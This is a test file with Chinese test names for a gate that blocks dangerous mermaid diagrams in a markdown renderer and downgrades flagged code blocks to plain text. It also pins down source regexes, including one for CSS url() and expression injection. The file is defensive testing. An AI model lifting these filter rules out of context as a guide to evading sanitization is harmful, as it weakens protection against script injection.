    const html = renderToStaticMarkup(
      createElement(ImagePreviewProvider, null, createElement(MarkdownText, { text: MALICIOUS_MD, streaming: true })),
    );
    expect(noticeTag(html)).toContain('data-pane-search-ignore="true"');
  });

  it("产物栏 / 修订视图用的共用 rehype 表（Streamdown 直接配）同样带——harden 在闸之后也没剥掉它", () => {
    for (const table of [STREAMDOWN_REHYPE_PLUGINS, REVISION_REHYPE_PLUGINS]) {
      const html = renderToStaticMarkup(
        createElement(
          Streamdown,
          { mode: "static", rehypePlugins: table, remarkPlugins: [...Object.values(defaultRemarkPlugins)] } as never,
          MALICIOUS_MD,
        ),
      );
      expect(noticeTag(html)).toContain('data-pane-search-ignore="true"');
    }
  });

  it("正常 mermaid 图没有提示 <p>，自然也没有该属性", () => {
    const html = renderToStaticMarkup(
      createElement(
        ImagePreviewProvider,
        null,
        createElement(MarkdownText, { text: ["前言", "", "```mermaid", "graph TD", "  A --> B", "```"].join("\n") }),
      ),
    );
    expect(html).not.toContain("data-mermaid-gated");
    expect(html).not.toContain("data-pane-search-ignore");
  });
});

describe("R8-7：mermaidCodesOf 遍历 pre 的子树，不只看第一个 code", () => {
  it("pre 里第一个 code 不是 mermaid、第二个才是且命中 → 被退回（原先只看第一个会漏）", () => {
    const first = codeEl("text", "说明文字");
    const second = codeEl("mermaid", DANGEROUS);
    const tree = runRehype([preOf(first, second)]);
    expect(tree.children).toHaveLength(2);
    expect(tree.children![0]!.properties?.dataMermaidGated).toBe("true");
    expect(classesOf(second)).toEqual(["language-text"]);
    expect(classesOf(first)).toEqual(["language-text"]); // 非 mermaid 的兄弟不动（本来就是 text）
  });

  it("第二个 code 是 mermaid 且正常 → 不动、没有提示；兄弟 code 的 class 保持原样", () => {
    const first = codeEl("js", "x");
    const second = codeEl("mermaid", SAFE);
    const tree = runRehype([preOf(first, second)]);
    expect(tree.children).toHaveLength(1);
    expect(classesOf(second)).toEqual(["language-mermaid"]);
    expect(classesOf(first)).toEqual(["language-js"]);
  });

  it("兄弟 code 里有危险文字、mermaid code 本身正常：整个 pre 的文本都扫（上游取哪个渲染不确定）→ 退回", () => {
    const first = codeEl("text", DANGEROUS);
    const second = codeEl("mermaid", SAFE);
    const tree = runRehype([preOf(first, second)]);
    expect(tree.children).toHaveLength(2);
    expect(classesOf(second)).toEqual(["language-text"]);
    expect(classesOf(first)).toEqual(["language-text"]);
  });

  it("多个 mermaid code 同在一个 pre 里：命中后全部改成 language-text", () => {
    const a = codeEl("mermaid", SAFE);
    const b = codeEl("mermaid", DANGEROUS);
    const tree = runRehype([preOf(a, b)]);
    expect(tree.children).toHaveLength(2);
    expect(classesOf(a)).toEqual(["language-text"]);
    expect(classesOf(b)).toEqual(["language-text"]);
  });

  it("code 被包了一层（pre > span > code）也找得到", () => {
    const code = codeEl("mermaid", DANGEROUS);
    const wrapper: Hast = { type: "element", tagName: "span", properties: {}, children: [code] };
    const tree = runRehype([preOf(wrapper)]);
    expect(tree.children).toHaveLength(2);
    expect(classesOf(code)).toEqual(["language-text"]);
  });

  it("只有非 mermaid 的 code（哪怕写着危险文字）不动；没有 code 的 pre 不崩", () => {
    const html = codeEl("html", DANGEROUS);
    const tree = runRehype([preOf(html), preOf({ type: "text", value: "x" })]);
    expect(tree.children).toHaveLength(2);
    expect(classesOf(html)).toEqual(["language-html"]);
    expect(tree.children!.some((n) => n.properties?.dataMermaidGated === "true")).toBe(false);
  });

  it("单个 code 的常规形态不变（命中：提示 + language-text；正常：原样）", () => {
    const bad = codeEl("mermaid", DANGEROUS);
    const good = codeEl("mermaid", SAFE);
    const tree = runRehype([preOf(bad), preOf(good)]);
    expect(tree.children!.map((n) => n.tagName)).toEqual(["p", "pre", "pre"]);
    expect(classesOf(bad)).toEqual(["language-text"]);
    expect(classesOf(good)).toEqual(["language-mermaid"]);
  });

  it("超长 mermaid 源码（> 200 KB）：rehype 层按 too-long 退回，提示说清「源码过长」", () => {
    const long = codeEl("mermaid", `graph TD\n${"A-->B\n".repeat(40_000)}`);
    const tree = runRehype([preOf(long)]);
    expect(tree.children).toHaveLength(2);
    expect(classesOf(long)).toEqual(["language-text"]);
    const text = tree.children![0]!.children![0]!.value ?? "";
    expect(text).toContain("源码过长");
    expect(text).toContain("只显示源码");
  });
});

// ───────── 源码契约：本文件钉死的实现要点 ─────────

describe("契约：实现要点留在源码里（防止被无意改回）", () => {
  const gate = readFileSync(path.join(ROOT, "src/lib/mermaid-source-gate.ts"), "utf8");
  const rehype = readFileSync(path.join(ROOT, "src/lib/mermaid-rehype-gate.ts"), "utf8");

  it("标签正则不再含「两个 \\s* 夹一个可选 /」的二次方形态", () => {
    expect(gate).not.toMatch(/<\\\\s\*\\\\\/\?\\\\s\*/);
    expect(gate).toMatch(/<\[\\\\s\/\]\*/);
  });

  it("CSS_URL_RE：url 紧贴括号、没有 expression", () => {
    const line = gate.split("\n").find((l) => l.startsWith("const CSS_URL_RE")) ?? "";
    expect(line).toContain("url\\(");
    expect(line).not.toContain("expression");
    expect(line).not.toMatch(/url\\s\*/);
  });

  it("rehype 层：提示 <p> 带 dataPaneSearchIgnore；不再用只取第一个 code 的 find", () => {
    expect(rehype).toContain("dataPaneSearchIgnore");
    expect(rehype).not.toMatch(/\.find\(\(c\) => isElement\(c, "code"\)\)/);
  });
});
